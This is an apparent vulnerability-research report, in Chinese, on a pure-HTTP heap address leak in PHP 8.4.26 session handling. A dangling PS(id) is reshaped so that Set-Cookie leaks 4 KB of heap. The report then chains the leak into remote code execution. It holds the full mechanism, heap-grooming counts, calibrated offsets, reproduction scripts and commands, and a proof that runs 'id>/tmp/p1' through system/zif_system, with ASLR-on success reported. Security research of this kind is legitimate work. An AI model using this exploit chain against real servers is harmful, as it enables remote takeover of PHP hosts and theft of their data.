# 纯 HTTP 堆地址泄漏：stale `PS(id)` + `Set-Cookie` 越界读

日期：2026-10-21
目标：PHP 8.4.26 + Apache 2.4.68 prefork + mod_php（Debian 12 amd64，`172.16.0.103`）
约束：**完全远程、只用 HTTP；不在目标 webroot 写任何特定 PHP 文件**。目标页面只有
`<?php echo "OK\n"; ?>`（无 session 调用；本泄漏不依赖脚本内容）。
状态：**堆地址（Zend MM 2MB chunk base）泄漏已打通**；libphp/libc **代码指针**泄漏
尚未完成，下一步见第 7 节。

---

## 1. 结论

用两个纯 HTTP 请求，从响应头 `Set-Cookie` 中拿到 **4096 字节的堆越界读**：

- 请求 A：先用 1001 个 POST 字段触发 `max_input_vars` 警告（`display_errors=On` 时
  该警告被输出，`SG(headers_sent)=1`），再用一个值为单字节 `\x00` 的 `PHPSESSID`
  让 `php_session_initialize()` 生成新 id 并置 `send_cookie=1`；随后
  `php_session_reset_id()` 因 headers 已发送而**发送 cookie 失败**，`send_cookie`
  残留为 1。A 末尾用 12MB 字段 OOM，留下悬空的 `PS(id)`（random id 的
  `zend_string`）。
- 请求 B：不带文件字段，pre-RINIT 的 upload-progress END cleanup 调用
  `php_session_initialize()`，`php_session_reset_id()` 看到 `send_cookie=1`、
  本请求 headers 尚未发送，于是用悬空的 `PS(id)` 构造
  `Set-Cookie: PHPSESSID=<url_encode(ZSTR_VAL(id), ZSTR_LEN(id))>`。
- B 的 multipart 字段把 A 遗留的 `PS(id)` 块重占成伪造 `zend_string` 头：
  `len=0x1000`，`data` 指向块内 offset 0x18。`php_url_encode` 按 len 读取，
  越过块尾进入相邻堆，把内容编码进 `Set-Cookie`。

实测（no-ASLR 校准）：

```text
Set-Cookie: PHPSESSID=LAAAA...%B2%D0%82f%60h%3F...%F5%FF%7F...
cookie 值 11548 字符（URL 编码），解码后 4096 字节
98 个 0x7f.... 指针，全部 & ~0x1fffff == 0x7ffff5e00000
```

即 **Zend MM chunk base 可直接从 HTTP 响应头恢复**，无需 `/proc/self/maps`、
无需目标侧 PHP、无需目标应用配合。

> 这与 `NOASLR_REPORT.md` 的纯 HTTP RCE 链正交：泄漏请求 A 在 `track_init` 之前
> 就失败（`reset_id` 失败），所以**不会**留下 `PS(http_session_vars)` 悬空引用；
> 它只负责留下悬空 `PS(id)` 和 `send_cookie=1`。

---

## 2. 机制与源码路径

### 2.1 让 `send_cookie` 残留为 1

`ext/session/session.c`：

```c
static zend_result php_session_initialize(void)
{
    ...
    if (!PS(id) || !ZSTR_VAL(PS(id))[0]) {      /* 空 id -> 新建 id */
        ...
        PS(id) = PS(mod)->s_create_sid(&PS(mod_data));
        ...
        if (PS(use_cookies)) {
            PS(send_cookie) = 1;
        }
    }
    ...
    if (php_session_reset_id() == FAILURE) {    /* 这里失败，track_init 不会执行 */
        php_session_abort();
        return FAILURE;
    }
    php_session_track_init();
    ...
}
```

`php_session_send_cookie()`：

```c
if (SG(headers_sent)) {
    php_error_docref(NULL, E_WARNING,
        "Session cookie cannot be sent after headers have already been sent");
    return FAILURE;
}
e_id = php_url_encode(ZSTR_VAL(PS(id)), ZSTR_LEN(PS(id)));
```

关键点：

1. **headers_sent 必须为 1**。用 `max_input_vars` 超限警告实现：
   `main/php_variables.c` 在变量数超过 1000 时
   `php_error_docref(NULL, E_WARNING, "Input variables exceeded ...")`；
   lab 的 `display_errors=On`，警告写入响应并置 `SG(headers_sent)=1`。
2. **id 首字节为 0**。multipart 的 `PHPSESSID` 值取单字节 `\x00`：
   `php_session_rfc1867_callback` 的 FORMDATA 分支要求 `value_len != 0`，
   所以 `progress->sid` 被设为长度 1、内容 `\0` 的字符串；FILE_START 中
   `PS(id) = zend_string_init(progress->sid)` 后，`!ZSTR_VAL(PS(id))[0]`
   成立，进入“新建 id”分支，`send_cookie=1`。
3. `reset_id` 因 headers_sent 失败 → `send_cookie` 保持 1，且
   `php_session_track_init()` 不会执行（所以没有 `$_SESSION` 引用）。
4. A 的最后用一个 12MB 普通字段触发 `memory_limit=8M` OOM；bailout 跳过请求
   shutdown，`ps_globals.id` 悬空（random id 的 32 字节 `zend_string`）。

实测 A 之后（gdb，setarch -R）：

```text
ps_globals.send_cookie = 1
ps_globals.id          = 0x7ffff5ea9000   (len=32, data0=0x35)
ps_globals.http_session_vars.type_info = 0 (UNDEF)
```

响应体同时出现两条关键警告，可作为远程侧的“前置条件已满足”信号：

```html
Warning: PHP Request Startup: Input variables exceeded 1000...
Warning: PHP Request Startup: Session cookie cannot be sent after headers have already been sent
```

### 2.2 B：用悬空 `PS(id)` 发送 `Set-Cookie`

B 不带文件字段，因此不会触发 FILE_START 的 `php_rinit_session(0)`（那会清空
PS 全局）。multipart END 事件 → `php_session_rfc1867_cleanup()` →
`php_session_initialize()` → `php_session_reset_id()`：

- `PS(use_cookies)=1`（默认）；
- `PS(send_cookie)=1`（A 残留）；
- B 本请求 headers 未发送 → 真正发送 cookie；
- `php_url_encode` 以 `ZSTR_LEN(PS(id))` 为长度、`ZSTR_VAL(PS(id))` 为起点读取。
  悬空块被 B 的字段重占后，len/data 完全受攻击者控制。

### 2.3 重占悬空 `PS(id)` 块

A 的 random id 长度 32，`zend_string_alloc(32)` = 24+32+1 = 57 → **64 字节 bin**；
本 lab 形状下块地址为 `chunk + 0xa9000`（no-ASLR：`0x7ffff5ea9000`）。

B 的 multipart 解析在请求启动时把 chunk 重新分页。校准发现该 stale 地址在 B 的
布局里落在 **80 字节 bin 页**：

1. 先发 N 个值长度为 48 的字段（`zend_string` = 24+48+1 = 73 → 80B bin）。
   每个字段留下一个**存活**的 80B 字符串，按 free-list 顺序占用块。
2. 用每字段唯一的 48 字符值（`v%04d` + `x`）可以读出“哪一块落在 stale 地址”：
   本 lab 下 `N=998` 时，`Set-Cookie` 的值为 `v0892...`，即第 893 个字段的
   字符串落在该块。
3. 改为发 **892 个**前置字段，再发 1 个 **79 字节值**的 forge 字段：
   - raw buffer 大小 79+1 = 80 → 80B bin；
   - 它的 value `zend_string` 是 24+79+1 = 104 → 112B bin（不占 80B 块）；
   - raw buffer 取的正是“第 893 个 80B 块” = stale `PS(id)` 块。
   raw buffer 内容布局（块起点为 S，`PS(id)=S`）：

   ```text
   S+0x00: gc（被 efree 的 free-list next 覆盖，无影响）
   S+0x08: h（任意）
   S+0x10: len = 0x1000（伪造）
   S+0x18: data[0] = 'L'，其后为填充
   ```

4. 字段处理完 raw buffer 被 `efree()`；Zend MM 只把 free-list 指针写到块
   offset 0，`+0x10` 的 len 保留。B 的 END cleanup 随后读
   `ZSTR_LEN(PS(id)) = 0x1000`，从 `S+0x18` 开始做 URL 编码。

`Set-Cookie` 发出后，`ps_files_open()` 的
`php_session_valid_key()` 会因 id 含非法字节而失败，产生
`Session ID is too long or contains illegal characters` 警告——此时泄漏已经
写入响应头，警告不影响结果。

---

## 3. 复现步骤

环境（与 `NOASLR_REPORT.md` 相同，额外注意两点）：

- `display_errors=On`（headers_sent 依赖警告实际输出）；
- `session.use_cookies=1`（默认；本 lab 曾为 0，需改回）；
- `memory_limit=8M`、`session.use_strict_mode=0`、`session.save_path=/tmp`、
  `max_input_vars=1000`（默认）。

```bash
# 目标机 172.16.0.103，ASLR 开/关均可；以下为校准的 no-ASLR 命令
cd ~/php2shell-work

# A：1001 个字段触发 max_input_vars 警告；PHPSESSID 为单字节 \x00；
#    文件字段触发 FILE_START；12MB 字段 OOM
python3 send_a_leak2.py 1001 12

# B：892 个 48 字符数值字段消费 80B 块；最后一个 79 字节值字段的 raw buffer
#    落在悬空 PS(id) 块，伪造 len=0x1000
python3 b_numleak2.py 892 1 0x1000
```

B 的响应头示例（截断）：

```text
Set-Cookie: PHPSESSID=LAAAA...%B2%D0%82f%60h%3F%C3%A0%90%EA%F5%FF%7F...
...
Warning: PHP Request Startup: Session ID is too long or contains illegal characters.
```

解码与指针提取：

```bash
python3 tools/decode_leak.py logs/http_heap_leak_20261021.resp
# decoded=4096, candidate_ptrs=98, chunk_bases=7ffff5e00000:98
```

原始响应归档：`logs/http_heap_leak_20261021.resp`；分析输出：
`logs/http_heap_leak_20261021.txt`。

---

## 4. 校准数据（本构建 / 本请求形状）

| 项 | 值 |
|---|---|
| A 后 `PS(id)`（stale `zend_string`） | `0x7ffff5ea9000` = chunk + `0xa9000` |
| id 长度 / 块大小 | 32 / 64B bin |
| B 重占后块所在 bin | 80B |
| 前置 48 字符字段数（定位） | `N=998` 时 value `v0892` 落在该块 |
| forge 前置字段数 | `K=892` |
| forge 字段值长度 | 79（raw 80B） |
| 伪造 len | `0x1000` |
| B 响应 `Set-Cookie` | 11548 字符（解码 4096B） |
| 泄漏指针 | 98 个，全部 `0x7ffff5e…`，chunk base `0x7ffff5e00000` |

补充（同一 stale 地址的重用证据）：

- `N=998` 且值为唯一 48 字符时，cookie 值就是 `v0892...`（len=48）——说明该块被
  存活的 80B 字符串重占；
- 数值键 + 短值（`b_numleak.py`）时 cookie 仍是正常 32 字符 id——说明该块未被
  使用；只有 80B 活字符串/raw 的分配序列能命中它。

---

## 5. 与 ASLR 链的关系

本泄漏提供 **Zend MM chunk base**。同一轮实验中已用外部地址验证：

- 校准后的纯 HTTP A/B RCE 链在 `personality=0`（ASLR 开）下 **3/3** 成功；
- 只依赖 chunk 内相对偏移：`R0 = chunk + 0x24e0`、fake HT data =
  `chunk + 0x6e0d8`（具体 A/B 形状见下）；
- libc base 通过 `/proc/<worker>/maps` 外部获取时，`system = libc + 0x4c490`，
  链完整执行 `id>/tmp/p1`。

也就是说：**A/B 内存链本身与 ASLR 无关**，只差“地址来源”。本节的 Set-Cookie
泄漏已经补上 heap 基址；还差 **libphp 代码指针**（用于 `zif_system`，
libphp + `0x43a870`，不需要 libc）或 libc 指针。

### 5.1 本轮同时得到的 no-ASLR 重校准

在 `172.16.0.103`（不是原报告的 172.16.1.112）上，原报告的固定参数不直接适用：

```text
A: send_a_pad.py 17 19 3 12 7:7 7:7 7:7 7:7 7:7 7:7
B: send_b_rce2.py 16 2 0x7ffff5e6e0d8 0x7ffff7d14490 "id>/tmp/p1"
```

- 6 个 `7:7` pad 把 A 的 reference 地址移到 `0x7ffff5e024e0`，
  `R0-0x10=0x7ffff5e024d0` 正好是 56B block 起点；
- B 需要 `N1=16`（31 字符 priming 字段）才能让 55B raw buffer 落在
  `R0-0x10`；
- 本机 libc `system = 0x7ffff7d14490`（偏移 `0x4c490`），fake HT data =
  `0x7ffff5e6e0d8`；
- proof：`/tmp/p1` 内容 `uid=33(www-data) ...`。

---

## 6. 限制

1. **`display_errors=On` 是前置条件**。headers_sent 来自警告输出；若目标关闭
   display_errors，本路径的 `send_cookie=1` 残留不成立（当前 lab 为 On）。
2. 需要 `>1000` 个 POST 变量（默认 `max_input_vars=1000`）才能触发警告；
   请求体约 1MB 级。
3. 需要 `session.use_cookies=1`（默认）与 `session.use_strict_mode=0`（默认 0）。
4. chunk 内偏移（`0xa9000`）、`N=998`、`K=892` 绑定本构建 + 本请求形状；
   换 PHP 构建 / 字段长度 / 边界长度需要重测。它们都是 **chunk 相对偏移**，
   与 ASLR 无关。
5. 泄漏只向高地址读（`PS(id)+0x18` 起）。当前 4KB 区域是 80B 字符串页，
   只含堆指针；1MB 的大范围泄漏（已验证可发）仍只看到堆指针，没有
   libphp/libc 代码指针。
6. 若 len 读到非受控值（例如 HashTable 的 `arData` / 64 位 hash），
   `php_url_encode` 的 `safe_emalloc` 会直接 fatal：
   `Possible integer overflow in memory allocation (3 * N + 32)`。
   这本身是一个“len 不可控”的信号，但拿不到数据。
7. 本泄漏 A 不产生 `PS(http_session_vars)` 悬空引用（`reset_id` 在
   `track_init` 之前失败），因此它不能和 RCE 的 A 合并成一个请求；
   两者是同一 worker 上可先后使用的独立原语。

---

## 7. 下一步：泄漏 libphp 代码指针

> **2026-10-21 后续进展（已完成）**：本节的目标已实现，并进一步打穿了纯 HTTP
> ASLR-on RCE（两次 Set-Cookie 泄漏 + `zif_system`），lab 内 5/5。做法：
> A 用 1001 个 39 字节值字段把 stale `PS(id)` 放到 `chunk+0xb7400`；B 用 983 个
> 嵌套数组，把 `$_POST['a0443']` 的 HashTable 扩到 16 个元素。`PS(id)+0x10` 读到
> `nTableSize=16`，数据区覆盖 `nNextFreeElement` 和 `pDestructor`
> （`ZVAL_PTR_DTOR = libphp+0x613c50`）。完整链路、payload 和驱动见
> [ASLR_PURE_HTTP.md](/Users/my/php2shell/ASLR_PURE_HTTP.md)。以下保留原始分析。

目标：拿到一个 libphp 代码地址（例如 HashTable 的
`pDestructor = ZVAL_PTR_DTOR`），配合已知 chunk base 使用 g18 的
Zend-only payload（`zif_system`，libphp + `0x43a870`），完成**完全纯 HTTP、
无外部地址**的 ASLR-on RCE。

已确认的实验事实：

- 用 998 个 `aNNNN[0]` 嵌套数组字段时，B 的 chunk 里出现大量 56B
  HashTable 页；gdb 扫描（no-ASLR）显示这些页含 73 个 libphp 指针/页，
  偏移包括 `0x2000, 0x76000, 0x7b000, …, 0xa9000, 0xad000, 0xb2000, …`。
- 当前 stale `PS(id)` 在 `chunk+0xa9000`；该偏移在嵌套数组 B 下正好是
  一个 56B HashTable 页。问题变成：**让 `PS(id)+0x10` 的 qword 是一个
  moderate 的 len，而不是 `arData`/hash 指针**。
- 可行方向（按优先级）：
  1. 调整 A 使 `PS(id)` 落在 `HT + 0x18`（则
     `len = nNextFreeElement`，data 从 `HT+0x30 = pDestructor` 开始）：
     需要 `PS(id) ≡ page + 0x18 (mod 56)`；由 `PS(id)=page+64m`
     （A 的 64B bin）得 `m ≡ 3 (mod 7)`，即 `page+0xc0`、`page+0x280` 等。
     扫描 A 的字段长度/边界长度/文件字段形状，找可达到的偏移。
  2. 或让 `PS(id)+0x10` 落在 `HT+0x20`（`len = nTableSize|nInternalPointer`）：
     需要 `PS(id) ≡ page + 0x10 (mod 56)`，对应 `m ≡ 2 (mod 7)`
     （`page+0x80` 等），并让该 HashTable 的 `nTableSize` 足够大
     （例如每数组 128 个元素 → len=128，足以覆盖 `pDestructor`）。
  3. 把 PS.id 移到 libphp 指针页的低偏移（如 `0x2000`）——需要更小的
     A 预堆或不同的 warning 触发方式；目前 1001 字段使 id 最低约
     `0x61040`。
- 拿到 libphp base 后，RCE 的 B 使用 `zif_system` + fake `zend_function`/
  `execute_data`（`tools/d_aslr.php` 的 Zend-only payload 布局），
  只需 chunk base + libphp base，不需要 libc。

---

## 8. 文件

| 文件 | 用途 |
|---|---|
| `tools/send_a_leak2.py` | 泄漏 A：1001 字段 + `max_input_vars` 警告 + 空/NUL PHPSESSID + 文件 + OOM |
| `tools/send_a_leak3.py` | 泄漏 A 变体：可调字段名/值长度、边界长度（用于移动 `PS(id)`） |
| `tools/b_numleak.py` | B：数值键、短值（用于确认 stale 块是否被覆盖） |
| `tools/b_numleak2.py` | **最终 B**：48 字符值消费 80B 块 + 79 字节 forge 字段 |
| `tools/b_consume.py` / `b_consume2.py` | 80B/64B 块消费实验 |
| `tools/b_nested.py` | 嵌套数组 B（用于把 56B HashTable 页铺到 chunk 各处） |
| `tools/send_b_leak.py` | 早期 B（裸 stale id / 伪造头原型） |
| `tools/decode_leak.py` | 解码 `Set-Cookie`、提取指针与 chunk base |
| `tools/aslr_demo.sh` | ASLR-on 验证：外部读 maps，3/3 证明 A/B 链相对布局稳定 |
| `logs/http_heap_leak_20261021.resp` | 原始泄漏响应（4096B 解码 / 11548 字符 cookie） |
| `logs/http_heap_leak_20261021.txt` | 解码后的指针列表与 chunk base 统计 |

---

## 9. 免责声明

仅用于授权环境中的漏洞研究与复现。请求形状、块偏移与 bin 序列绑定本 lab 的
PHP 8.4.26 构建与 Apache/mod_php 配置；换构建或配置需重新校准。
